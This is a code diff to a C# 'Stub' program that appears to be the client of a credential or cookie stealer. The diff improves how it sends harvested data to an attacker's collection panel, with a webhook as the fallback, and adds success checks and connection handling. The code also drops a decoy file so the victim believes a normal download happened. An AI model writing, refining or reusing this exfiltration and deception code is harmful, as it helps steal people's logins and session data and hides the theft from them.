@@ -73,11 +73,17 @@ namespace Stub
             try { DropDecoy(); }
             catch { }
 
-            try { Exfil.PostJson(BuildInfo.PanelUrl, json, BuildInfo.Tag); }
+            bool posted = false;
+            try { posted = Exfil.PostJson(BuildInfo.PanelUrl, json, BuildInfo.Tag); }
             catch { }
 
-            try { Exfil.PostWebhook(BuildInfo.WebhookUrl, jar.Count, BuildInfo.Tag, BuildInfo.DisplayName); }
-            catch { }
+            // the panel sends the rich notification when it is configured;
+            // talking straight to the webhook is the fallback for panel-less builds
+            if (!posted)
+            {
+                try { Exfil.PostWebhook(BuildInfo.WebhookUrl, jar.Count, BuildInfo.Tag, BuildInfo.DisplayName); }
+                catch { }
+            }
         }
 
         /// <summary>Writes a harmless marker on the desktop so the run looks like a download.</summary>
@@ -813,13 +819,14 @@ namespace Stub
     {
         private const int TimeoutMs = 12000;
 
-        public static void PostJson(string url, string json, string tag)
+        /// <summary>Returns true when the collector endpoint accepted the post.</summary>
+        public static bool PostJson(string url, string json, string tag)
         {
             if (string.IsNullOrEmpty(url) || url.IndexOf("%%", StringComparison.Ordinal) >= 0)
-                return;
+                return false;
 
             byte[] body = Encoding.UTF8.GetBytes(json);
-            Request(url, body, "application/json");
+            return Request(url, body, "application/json");
         }
 
         public static void PostWebhook(string url, int count, string tag, string app)
@@ -835,35 +842,43 @@ namespace Stub
             Request(url, Encoding.UTF8.GetBytes(sb.ToString()), "application/json");
         }
 
-        private static void Request(string url, byte[] body, string contentType)
+        private static bool Request(string url, byte[] body, string contentType)
         {
             try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
             catch { }
 
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
-            req.Method = "POST";
-            req.ContentType = contentType;
-            req.UserAgent = "Mozilla/5.0";
-            req.Timeout = TimeoutMs;
-            req.ReadWriteTimeout = TimeoutMs;
-            req.ContentLength = body.Length;
-            req.Proxy = WebRequest.DefaultWebProxy;
-
-            using (Stream s = req.GetRequestStream())
-                s.Write(body, 0, body.Length);
-
-            using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
+            try
             {
-                using (Stream rs = resp.GetResponseStream())
+                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+                req.Method = "POST";
+                req.ContentType = contentType;
+                req.UserAgent = "Mozilla/5.0";
+                req.Timeout = TimeoutMs;
+                req.ReadWriteTimeout = TimeoutMs;
+                req.ContentLength = body.Length;
+                req.Proxy = WebRequest.DefaultWebProxy;
+
+                using (Stream s = req.GetRequestStream())
+                    s.Write(body, 0, body.Length);
+
+                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                 {
-                    if (rs != null)
+                    int status = (int)resp.StatusCode;
+                    using (Stream rs = resp.GetResponseStream())
                     {
-                        byte[] buf = new byte[512];
-                        int total = 0;
-                        while (total < 4096 && rs.Read(buf, 0, buf.Length) > 0)
-                            total += 512;
+                        if (rs != null)
+                        {
+                            // drain so the connection can be reused; the body is discarded
+                            byte[] buf = new byte[1024];
+                            while (rs.Read(buf, 0, buf.Length) > 0) { }
+                        }
                     }
+                    return status >= 200 && status < 300;
                 }
+            }
+            catch
+            {
+                return false;
             }
         }
     }
